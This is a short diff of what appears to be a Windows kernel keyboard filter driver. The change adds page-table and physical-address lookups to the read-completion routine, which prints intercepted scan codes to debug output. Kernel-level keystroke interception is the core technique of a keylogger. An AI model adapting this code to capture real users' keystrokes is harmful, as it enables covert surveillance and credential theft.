@@ -4,6 +4,7 @@
 #include <Driver.h>   
 #include <ControlDevice.h>
 #include <scancode.h>
+#include <PageTableManipulation.h>
 
 PDEVICE_OBJECT usbKeyboardDeviceObject;
 VOID pauseForABit(CSHORT secondsDelay) {
@@ -79,9 +80,23 @@ NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOI
 
 			PHYSICAL_ADDRESS fileObjectPA = MmGetPhysicalAddress(fileObject);
 			PHYSICAL_ADDRESS keysPA = MmGetPhysicalAddress(keys);
+			
 
-			KdPrint((" [0x%lx] [0x%lx] ", keys, keysPA));
-			KdPrint((" [0x%lx] [0x%lx] ", fileObject, fileObjectPA));
+//			PVOID cr3 = GetCr3();
+//			KdPrint((" cr3 [0x%lx] ", cr3));
+
+
+			ULONG pageDirectoryPointerIndex = (ULONG)keys >> 30;
+			KdPrint((" index is [%lu] ", pageDirectoryPointerIndex));
+
+			
+
+			GetPhysAddress(keys);
+			GetPhysAddressPhysically(keys);
+			//KdPrint((" keys [0x%lx] [0x%lx] [0x%lx] ", keys, keysPA, keysHpa));
+
+			KdPrint((" keys [0x%lx] [0x%llx]  H[0x%lx] L[0x%lx] ", keys, keysPA.QuadPart, keysPA.u.HighPart, keysPA.u.LowPart));
+			KdPrint((" fo [0x%lx] [0x%lx] \n", fileObject, fileObjectPA));
 
 
 			KdPrint((" ScanCode: %x %c %s",
